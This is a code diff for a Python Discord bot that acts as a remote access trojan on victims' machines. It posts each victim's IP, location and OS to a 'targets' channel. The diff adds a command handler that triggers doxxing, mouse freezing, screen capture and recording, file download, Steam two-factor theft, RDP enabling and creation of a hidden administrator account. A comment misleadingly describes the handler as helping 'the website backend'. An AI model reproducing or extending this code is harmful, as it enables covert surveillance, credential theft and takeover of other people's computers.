@@ -13,6 +13,7 @@ from features.steam2fa import *
 from features.screenRecord import *
 from features.windows import *
 import json
+import re
 
 
 __DISCORD_TARGETS_CHANNEL_NAME = "targets"
@@ -50,6 +51,36 @@ def main():
             c2 = bot.get_channel(channel_id.id)
             await c2.edit(topic=f"IP: {ip} | COUTRY: {country} | CITY: {city} | OS: {platform.platform()}")
 
+    # this blob is for helping the website backend
+    @bot.event
+    async def on_message(message):
+        if re.match(r'!dox',message.content):
+            await dox(await bot.get_context(message))
+        elif re.match(r'!mouse \d+',message.content):
+            freeze_time = re.findall(r'\d+[smh]$', message.content)[0]
+            await mouse(await bot.get_context(message), freeze_time)
+        elif re.match(r'!screen',message.content):
+            await screen(await bot.get_context(message))
+        elif re.match(r'!download .+',message.content):
+            path = re.sub(r'^\!download\s+','', message.content)
+            await download(await bot.get_context(message), path)
+        elif re.match(r'!record \d+[smh]',message.content):
+            record_time = re.findall(r'\d+[smh]$', message.content)[0]
+            await record(await bot.get_context(message), record_time)
+        elif re.match(r'!disconnect',message.content):
+            await disconnect(await bot.get_context(message))
+        elif re.match(r'!safe_disconnect',message.content):
+            await safe_disconnect(await bot.get_context(message))
+        elif re.match(r'!getSteam2fa',message.content):
+            await getSteam2fa(await bot.get_context(message))
+        elif re.match(r'!rdp_enable',message.content):
+            await rdp_enable(await bot.get_context(message))
+        elif re.match(r'!create_admin_user',message.content):
+            await create_admin_user(await bot.get_context(message))
+        elif re.match(r'!help',message.content):
+            await help(await bot.get_context(message))
+
+
     @bot.command()
     async def dox(ctx):
         if ctx.channel.name != generate_uuid():
@@ -75,7 +106,7 @@ def main():
         if ctx.channel.name != generate_uuid():
             return
             
-        screen_path = await screenshot()
+        screen_path = screenshot()
         await ctx.send(file=discord.File(screen_path))
         os.remove(screen_path)
 
